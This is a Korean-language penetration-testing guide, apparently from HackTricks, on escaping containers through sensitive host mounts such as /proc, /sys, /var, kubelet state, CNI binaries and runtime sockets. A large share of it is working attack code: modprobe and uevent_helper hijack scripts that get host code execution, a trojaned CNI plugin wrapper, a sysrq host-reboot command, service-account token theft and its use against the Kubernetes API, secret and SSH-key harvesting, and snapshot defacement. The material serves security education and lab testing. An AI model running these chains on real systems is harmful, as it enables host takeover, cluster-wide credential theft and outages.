# 민감한 Host Mount

{{#include ../../../banners/hacktricks-training.md}}

## 개요

Host mount는 신중하게 격리된 process view를 host 리소스에 대한 직접적인 가시성으로 되돌리는 경우가 많기 때문에, 가장 중요한 실용적인 container-escape attack surface 중 하나입니다. 위험한 경우는 `/`에만 국한되지 않습니다. `/proc`, `/sys`, `/var`, runtime socket, kubelet이 관리하는 state 또는 device 관련 path를 bind mount하면 kernel control, credential, 인접 container filesystem 및 runtime management interface가 노출될 수 있습니다.

이 페이지는 abuse model이 여러 영역에 걸쳐 있기 때문에 개별 protection 페이지와 별도로 존재합니다. writable host mount가 위험한 이유는 mount namespace, user namespace, AppArmor 또는 SELinux coverage, 그리고 노출된 정확한 host path가 서로 복합적으로 작용하기 때문입니다. 이를 별도 주제로 다루면 attack surface를 훨씬 쉽게 분석할 수 있습니다.

## `/proc` 노출

procfs에는 일반적인 process 정보와 영향력이 큰 kernel control interface가 모두 포함되어 있습니다. 따라서 `-v /proc:/host/proc`와 같은 bind mount 또는 예상치 못하게 writable proc entry를 노출하는 container view는 information disclosure, denial of service 또는 직접적인 host code execution으로 이어질 수 있습니다.

주요 procfs path는 다음과 같습니다.

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (특히 `register` 및 `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

먼저 어떤 주요 procfs entry가 보이거나 writable 상태인지 확인합니다.
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sys/fs/binfmt_misc/status \
/proc/sys/fs/binfmt_misc/register \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
이러한 경로가 흥미로운 이유는 서로 다릅니다. 쓰기 가능한 경우 `core_pattern`, `modprobe`, `binfmt_misc`는 호스트 코드 실행 경로가 될 수 있습니다. `kallsyms`, `kmsg`, `kcore`, `config.gz`는 커널 exploitation을 위한 강력한 reconnaissance 소스입니다. `sched_debug`와 `mountinfo`는 프로세스, cgroup, 파일시스템 컨텍스트를 드러내므로 컨테이너 내부에서 호스트 레이아웃을 재구성하는 데 도움이 됩니다.

각 경로의 실질적인 가치는 서로 다르며, 이를 모두 동일한 impact를 가진 것처럼 취급하면 triage가 더 어려워집니다:

- `/proc/sys/kernel/core_pattern`
쓰기 가능한 경우 가장 impact가 큰 procfs 경로 중 하나입니다. 커널은 crash 후 pipe handler를 실행하기 때문입니다. 컨테이너가 `core_pattern`을 overlay에 저장된 payload나 mount된 호스트 경로를 가리키도록 설정할 수 있다면, 호스트 코드 실행을 획득할 수 있는 경우가 많습니다. 전용 예시는 [read-only-paths.md](protections/read-only-paths.md)도 참조하세요.
- `/proc/sys/kernel/modprobe`
이 경로는 커널이 module-loading 로직을 호출해야 할 때 사용하는 userspace helper를 제어합니다. 컨테이너에서 쓰기 가능하고 호스트 컨텍스트에서 해석된다면, 또 다른 호스트 코드 실행 primitive가 될 수 있습니다. 특히 helper 경로를 trigger할 방법과 결합할 때 흥미롭습니다.
- `/proc/sys/vm/panic_on_oom`
일반적으로 깔끔한 escape primitive는 아니지만, OOM 조건을 kernel panic 동작으로 전환하여 memory pressure를 호스트 전체의 denial of service로 바꿀 수 있습니다.
- `/proc/sys/fs/binfmt_misc`
registration interface가 쓰기 가능한 경우, 공격자는 선택한 magic value에 대한 handler를 등록하고 일치하는 파일이 실행될 때 호스트 컨텍스트에서 execution을 획득할 수 있습니다.
- `/proc/config.gz`
kernel exploit triage에 유용합니다. 호스트 package metadata 없이 어떤 subsystem, mitigation, optional kernel feature가 활성화되어 있는지 확인하는 데 도움이 됩니다.
- `/proc/sysrq-trigger`
대부분 denial-of-service 경로이지만 매우 심각한 경로입니다. 호스트를 즉시 reboot하거나 panic 상태로 만들거나, 그 밖의 방식으로 중단시킬 수 있습니다.
- `/proc/kmsg`
커널 ring buffer 메시지를 드러냅니다. 호스트 fingerprinting, crash analysis, 그리고 일부 환경에서 kernel exploitation에 유용한 정보의 leak에 사용할 수 있습니다.
- `/proc/kallsyms`
읽을 수 있다면 유용합니다. export된 kernel symbol 정보를 노출하며, kernel exploit 개발 중 address randomization 가정을 우회하는 데 도움이 될 수 있습니다.
- `/proc/[pid]/mem`
직접적인 process-memory interface입니다. 필요한 ptrace 스타일 조건을 충족하면서 target process에 접근할 수 있다면, 다른 프로세스의 memory를 읽거나 수정할 수 있습니다. 현실적인 impact는 credentials, `hidepid`, Yama, ptrace restrictions에 크게 좌우되므로 강력하지만 조건부인 경로입니다.
- `/proc/kcore`
시스템 memory를 core-image 스타일로 보여주는 view를 노출합니다. 파일이 매우 크고 사용하기 까다롭지만, 의미 있게 읽을 수 있다면 호스트 memory surface가 심각하게 노출되어 있음을 의미합니다.
- `/dev/kmem` 및 `/dev/mem`
이는 procfs 파일이 아니라 역사적으로 impact가 큰 raw-memory **device** interface입니다. 많은 modern system에서는 없거나 강하게 제한되어 있지만, 컨테이너가 호스트에 mount된 사본을 open할 수 있다면 해당 노출을 critical로 취급해야 합니다. 존재하지 않는 `/proc/kmem` 또는 `/proc/mem` 경로를 검색하기보다는 다른 민감한 `/dev` mount와 함께 검토하세요.
- `/proc/sched_debug`
스케줄링 및 task 정보를 leak하여 다른 process view가 예상보다 깔끔하게 보이는 경우에도 호스트 프로세스 identity를 노출할 수 있습니다.
- `/proc/[pid]/mountinfo`
컨테이너가 호스트의 실제 어디에 위치하는지, 어떤 경로가 overlay-backed인지, writable mount가 호스트 content에 해당하는지 아니면 컨테이너 layer에만 해당하는지를 재구성하는 데 매우 유용합니다.

`/proc/[pid]/mountinfo` 또는 overlay 세부 정보를 읽을 수 있다면 이를 사용하여 컨테이너 filesystem의 호스트 경로를 복구하세요:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
이 명령어들은 여러 host-execution 기법에서 container 내부의 경로를 host 관점에서 대응하는 경로로 변환해야 하기 때문에 유용합니다.

### 예시: `modprobe` Helper 경로 준비

`/proc/sys/kernel/modprobe`를 container에서 쓸 수 있고 helper 경로가 host context에서 해석된다면, 이를 공격자가 제어하는 payload로 리디렉션할 수 있습니다. overlay upper directory는 host에서 확인할 수 있는 경로로 해석되어야 하며, container가 host의 `/tmp`도 mount하지 않는 경우 proof output은 동일한 host-visible container layer에 다시 기록되어야 합니다:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```
정확한 트리거는 대상과 kernel 동작에 따라 달라지며, 의도적으로 추측하지 않습니다. lab을 떠나기 전에 원래 값을 복원하십시오. 중요한 점은 writable helper path가 이후 kernel helper invocation을 attacker-controlled host-path content로 redirect할 수 있다는 것입니다. 누락된 overlay `upperdir`, host가 resolve할 수 없는 path, read-only sysctl mount 또는 선택한 helper를 전혀 invoke하지 않는 kernel에서는 이 chain이 중단됩니다.

### 전체 예시: `kallsyms`, `kmsg` 및 `config.gz`를 사용한 Kernel Recon

목표가 즉각적인 escape가 아니라 exploitability assessment인 경우:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
이 명령어들은 유용한 symbol 정보가 표시되는지, 최근 kernel 메시지에서 흥미로운 상태가 드러나는지, 그리고 어떤 kernel 기능이나 mitigation이 컴파일되었는지 확인하는 데 도움이 됩니다. 일반적으로 그 영향은 직접적인 escape가 아니지만, kernel 취약점 triage에 필요한 시간을 크게 줄일 수 있습니다.

### 전체 예시: SysRq 호스트 재부팅

`/proc/sysrq-trigger`가 쓰기 가능하고 호스트 뷰에 도달한다면:
```bash
echo b > /proc/sysrq-trigger
```
효과는 호스트가 즉시 재부팅되는 것입니다. 이는 미묘한 예시는 아니지만, procfs 노출이 단순한 정보 공개보다 훨씬 심각할 수 있음을 명확히 보여줍니다.

## `/sys` 노출

sysfs는 대량의 kernel 및 device 상태를 노출합니다. 일부 sysfs 경로는 주로 fingerprinting에 유용하지만, 다른 경로는 helper 실행, device 동작, security-module 구성 또는 firmware 상태에 영향을 줄 수 있습니다.

주요 sysfs 경로는 다음과 같습니다.

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

이러한 경로가 중요한 이유는 서로 다릅니다. `/sys/class/thermal`은 thermal-management 동작에 영향을 줄 수 있으므로, 제대로 보호되지 않은 환경에서는 호스트 안정성에 영향을 줄 수 있습니다. `/sys/kernel/vmcoreinfo`는 crash-dump 및 kernel-layout 정보를 leak할 수 있어 low-level host fingerprinting에 도움이 됩니다. `/sys/kernel/security`는 Linux Security Modules가 사용하는 `securityfs` 인터페이스이므로, 예기치 않은 접근을 통해 MAC 관련 상태가 노출되거나 변경될 수 있습니다. EFI variable 경로는 firmware가 관리하는 boot 설정에 영향을 줄 수 있으므로, 일반적인 configuration 파일보다 훨씬 심각한 문제가 될 수 있습니다. `/sys/kernel/debug` 아래의 `debugfs`는 특히 위험합니다. 이는 의도적으로 developer 중심의 인터페이스로 제공되며, production 환경을 대상으로 강화된 kernel API보다 안전성에 대한 기대 수준이 훨씬 낮기 때문입니다.

이 목록의 모든 sysfs 항목은 **kernel, configuration 및 hardware에 따라 달라집니다**. 현재의 virtualized node에서는 일반적으로 `uevent_helper`, EFI variable 및 thermal-device 항목이 완전히 누락되어 있을 수 있습니다. 경로가 존재하지 않는 경우, 다른 kernel의 예시가 적용된다고 가정하지 말고 negative prerequisite로 기록하세요.

이러한 경로를 검토할 때 유용한 명령은 다음과 같습니다.
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
이러한 항목들이 흥미로운 이유:

- `/sys/kernel/security`는 AppArmor, SELinux 또는 다른 LSM surface가 원래 host 전용으로 남아 있어야 하는 방식으로 노출되어 있는지 보여줄 수 있습니다.
- `/sys/kernel/debug`는 이 그룹에서 가장 우려스러운 항목인 경우가 많습니다. `debugfs`가 mount되어 있고 읽기 또는 쓰기가 가능하다면, 광범위한 kernel-facing surface가 존재한다고 봐야 하며, 정확한 위험은 활성화된 debug node에 따라 달라집니다.
- EFI variable 노출은 덜 일반적이지만, 일반적인 runtime file이 아니라 firmware-backed setting에 접근하므로 영향이 큽니다.
- `/sys/class/thermal`은 깔끔한 shell-style escape보다는 host 안정성과 hardware interaction 측면에서 주로 중요합니다.
- `/sys/kernel/vmcoreinfo`는 주로 host fingerprinting 및 crash analysis의 source이며, low-level kernel state를 파악하는 데 유용합니다.

### 전체 예시: `uevent_helper`

`/sys/kernel/uevent_helper`는 kernel 및 configuration에 따라 달라지며, 현재 시스템 대부분에는 없습니다. 해당 파일이 존재하고 writable하며 사용 가능한 `uevent` trigger가 있다면, kernel이 attacker-controlled helper를 실행할 수 있습니다. Proof output에는 host와 container 양쪽 view에서 모두 보이는 path를 사용해야 합니다:
```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
echo "No writable, pre-approved uevent trigger was found" >&2
exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```
이것이 작동하는 이유는 helper path가 host의 관점에서 해석되기 때문입니다. 트리거되면 helper는 현재 container 내부가 아니라 host context에서 실행됩니다. `/sys/class/mem/null/uevent`는 이를 노출하는 kernel에서 사용할 수 있는 하나의 구체적인 trigger입니다. 다른 device는 자체 `uevent` 파일을 노출할 수도 있지만, 실제 hardware에서 아무 파일이나 무작정 선택하지 마십시오. lab을 떠나기 전에 원래 값을 복원하십시오. helper file 또는 제어 가능한 trigger가 없을 때는 이 technique을 사용 가능하다고 보고하지 마십시오.

## `/var` 노출

host의 `/var`를 container에 mount하는 것은 `/`를 mount하는 것만큼 극적으로 보이지 않기 때문에 과소평가되는 경우가 많습니다. 실제로는 runtime socket, container snapshot directory, kubelet이 관리하는 pod volume, projected service-account token, 인접 application filesystem에 접근하기에 충분할 수 있습니다. 최신 node에서는 실제로 가장 중요한 container 운영 상태가 `/var`에 존재하는 경우가 많습니다.

### Kubernetes 예시

`hostPath: /var`를 사용하는 pod는 다른 pod의 projected token과 overlay snapshot content를 읽을 수 있는 경우가 많습니다:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
이 명령어들은 해당 mount가 단순한 애플리케이션 데이터만 노출하는지, 아니면 영향력이 큰 cluster credentials까지 노출하는지 판단하는 데 유용합니다. 읽을 수 있는 service-account token이 있으면 로컬 code execution이 즉시 Kubernetes API access로 이어질 수 있습니다.

token이 있다면 token 발견에서 멈추지 말고, 해당 token으로 접근할 수 있는 범위를 검증하세요:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
여기서의 영향은 로컬 노드 액세스보다 훨씬 클 수 있습니다. 광범위한 RBAC 권한이 있는 token은 마운트된 `/var`를 클러스터 전체 침해로 이어지게 할 수 있습니다.

### Docker 및 containerd 예시

Docker 호스트에서는 관련 데이터가 대개 `/var/lib/docker` 아래에 있으며, containerd 기반 Kubernetes 노드에서는 `/var/lib/containerd` 또는 snapshotter별 경로 아래에 있을 수 있습니다:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
마운트된 `/var`가 다른 workload의 쓰기 가능한 snapshot 콘텐츠를 노출하면, 공격자는 현재 container 설정을 건드리지 않고도 애플리케이션 파일을 수정하거나, 웹 콘텐츠를 심거나, startup scripts를 변경할 수 있습니다.

**disposable lab workload**에서는 쓰기 가능한 snapshot 콘텐츠를 통해 애플리케이션 변조, secret 복구 또는 lateral movement를 시연할 수 있습니다. 먼저 runtime container ID를 정확한 snapshot에 매핑하고, 관련 없는 snapshot이나 production snapshot은 절대 수정하지 마세요:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```
이 명령들은 mount된 `/var`의 세 가지 주요 영향 범위인 애플리케이션 변조, secret 복구, 인접 workload로의 lateral movement를 보여 주기 때문에 유용합니다.

직접적인 snapshot 쓰기는 runtime의 일반적인 상태 관리를 우회하므로 container를 손상시키거나 증거를 파괴할 수 있습니다. 읽기 전용 discovery는 Docker `overlay2`를 대상으로 로컬에서 재현되었습니다. 인접한 일회성 container에 기록한 marker가 `/var/lib/docker/overlay2/<id>/diff/` 아래에 나타났습니다. 실제 snapshot 수정은 해당 테스트를 위해 생성한 일회성 container로 제한해야 합니다.

## Kubelet State, Plugins And CNI Paths

`/var/lib/kubelet`, `/opt/cni/bin` 또는 `/etc/cni/net.d`의 mount는 privileged DaemonSets, CNI agents, CSI node plugins, GPU operators 및 storage helpers를 통해 노출되는 경우가 많습니다. 이러한 mount는 "node plumbing"으로 쉽게 치부되지만, 새 pod의 실행 경로에 직접 위치하며 kubelet credentials, projected secrets, registration sockets 및 실행 가능한 host-side plugin binaries를 포함하는 경우가 많습니다.

High-value targets에는 다음이 포함됩니다.

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

유용한 review 명령은 다음과 같습니다:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
이 경로들이 중요한 이유:

- `/var/lib/kubelet/pki`는 kubelet client certificates 및 기타 node-local credentials를 노출할 수 있으며, cluster 설계에 따라 API server 또는 kubelet-facing TLS endpoints에 재사용될 수 있습니다.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods`에는 같은 node의 인접한 pods에 대한 projected service-account tokens 및 mounted Secrets가 포함되는 경우가 많습니다.
- `/var/lib/kubelet/pod-resources/kubelet.sock`은 주로 reconnaissance surface이지만 매우 유용합니다. 현재 어떤 pods와 containers가 GPUs, hugepages, SR-IOV devices 및 기타 희소한 node-local resources를 사용하는지 보여줍니다.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, `/var/lib/kubelet/plugins_registry`는 설치된 CSI, DRA 및 device plugins와 kubelet이 통신할 것으로 예상되는 sockets를 보여줍니다. 해당 directories가 단순히 readable한 것이 아니라 writable하다면 finding은 훨씬 더 심각해집니다.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` 및 `/etc/cni/net.d`는 pod-network setup 경로에 직접 위치합니다. 이곳에 대한 writable access는 단순한 configuration exposure가 아니라 지연된 host-execution primitive인 경우가 많습니다.<sup>[[2]](#references)</sup>

### 전체 예시: Writable `/opt/cni/bin`

host CNI binary directory가 read-write로 mount되어 있다면, plugin을 교체하는 것만으로도 kubelet이 해당 node에서 다음 pod sandbox를 생성할 때 host execution을 획득할 수 있습니다.<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```
이는 마운트된 `docker.sock`만큼 즉각적이지는 않지만, 침해된 Kubernetes 인프라 Pod에서는 더 현실적인 경우가 많습니다. 마커는 마운트된 plugin 옆에 기록되므로, 컨테이너는 host-root 또는 host-`/tmp` 마운트가 없어도 이를 가져올 수 있습니다. wrapper는 원래 인자와 standard input을 보존한 다음, 예제에서 원래 binary를 복원합니다. 중요한 점은 수정된 binary가 현재 컨테이너가 아니라 이후 host network setup flow에 의해 실행된다는 것입니다. 잘못된 wrapper로 인해 새 Pod sandbox에 networking이 제공되지 않을 수 있으므로, 폐기 가능한 node에서만 사용하세요.

## Runtime Sockets

민감한 host mount에는 전체 디렉터리가 아니라 runtime socket이 포함되는 경우가 많습니다. 이는 여기서 명시적으로 다시 강조할 만큼 중요합니다:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
이러한 socket 중 하나가 mount된 후의 전체 exploitation 흐름은 [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md)를 참조하세요.

빠른 초기 interaction 패턴은 다음과 같습니다:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
If one of these succeeds, the path from "mounted socket" to "start a more privileged sibling container" is usually much shorter than any kernel breakout path.

## Writable Host Path Task Hijack

쓰기 가능한 host mount는 위험하려면 `/`를 노출할 필요가 없습니다. mount된 경로에 scripts, config files, hooks, plugins 또는 이후 host-side scheduled task나 service가 사용하는 files가 포함되어 있다면, container가 host가 실행하는 내용을 변경할 수 있습니다.

일반적인 검토 흐름:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
writable file이 host process에서 사용된다면, 테스트 중에는 payload를 단순하고 관찰 가능하게 유지하세요:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
흥미로운 부분은 trust boundary입니다. write는 컨테이너 내부에서 발생하지만, execution은 나중에 host service context에서 발생합니다. 이로 인해 제한적인 hostPath 또는 bind mount가 지연된 host-code-execution primitive로 전환됩니다.

## Mount-Related CVEs

Host mount는 runtime 취약점과도 연관됩니다. 최근의 주요 사례는 다음과 같습니다.

- `runc`의 `CVE-2024-21626`: 유출된 directory file descriptor를 통해 working directory가 host filesystem을 가리키도록 만들 수 있습니다.
- BuildKit의 `CVE-2024-23651`, `CVE-2024-23652`, `CVE-2024-23653`: 악의적인 Dockerfile, frontend 및 `RUN --mount` flow를 통해 build 중 host file access, deletion 또는 elevated privileges가 다시 허용될 수 있습니다.
- Buildah 및 Podman build flow의 `CVE-2024-1753`: build 중 조작된 bind mount를 통해 `/`를 read-write로 노출할 수 있습니다.
- `containerd` 2.1.0의 `CVE-2025-47290`: image unpack 중 TOCTOU가 발생하여, 특별히 제작된 image가 pull 과정에서 host filesystem을 수정할 수 있습니다.

이러한 CVE가 여기서 중요한 이유는 mount handling이 operator configuration에만 국한되지 않음을 보여주기 때문입니다. runtime 자체도 mount-driven escape condition을 발생시킬 수 있습니다.

## Checks

다음 명령을 사용하면 우선순위가 가장 높은 mount exposure를 빠르게 찾을 수 있습니다.
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
여기서 흥미로운 점:

- Host root, `/proc`, `/sys`, `/var`, runtime sockets는 모두 우선순위가 높은 발견 항목입니다.
- 쓰기 가능한 proc/sys 항목은 해당 mount가 안전한 container view가 아니라 host 전역 kernel controls를 노출하고 있음을 의미하는 경우가 많습니다.
- Mount된 `/var` 경로는 단순한 filesystem 검토뿐 아니라 credential 및 인접 workload 검토도 필요합니다.
- Kubelet state directories와 CNI/plugin paths는 runtime sockets와 동일한 우선순위로 검토해야 합니다. 이러한 경로는 node의 pod 생성 및 credential 배포 경로에 직접 위치하는 경우가 많기 때문입니다.

## Local Validation Status

이 페이지의 실용적인 chain은 로컬 Linux minikube node를 대상으로 확인했습니다. 검증을 통해 다음 사항을 재현했습니다.

- 임시 writable hostPath를 통한 read 및 write access
- `/var/lib/kubelet/pods`를 통한 projected ServiceAccount tokens 및 mounted Secrets 발견
- 해당 mounted kubelet state에서 복구한 live token을 사용한 성공적인 Kubernetes API authentication
- Mount된 `/var`를 통한 인접 Docker `overlay2` filesystem의 read-only 발견
- Mount된 `docker.sock`을 통한 read-only host bind가 적용된 sibling container의 Docker API 생성
- 임시 host-consumed hook을 통한 지연된 host execution
- 원래 plugin의 arguments, standard input 및 execution을 유지한 CNI-wrapper simulation

동일한 node는 `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` 및 `config.gz`를 노출했지만, `uevent_helper`, EFI variables, thermal entries 또는 `sched_debug`는 노출하지 않았습니다. Destructive kernel triggers는 실행하지 않았습니다. 이는 host-root, `/var`, kubelet-state, socket 및 host-consumer chain이 재현 가능하다는 것을 확인해 주지만, procfs/sysfs helper techniques는 정확한 kernel, mount mode, payload path 및 trigger에 따라 조건부로 다뤄야 합니다.

## References

- [1] [Kubelet이 사용하는 로컬 파일 및 경로](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container가 `hostPath` mount를 통해 host에 접근할 수 있음](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
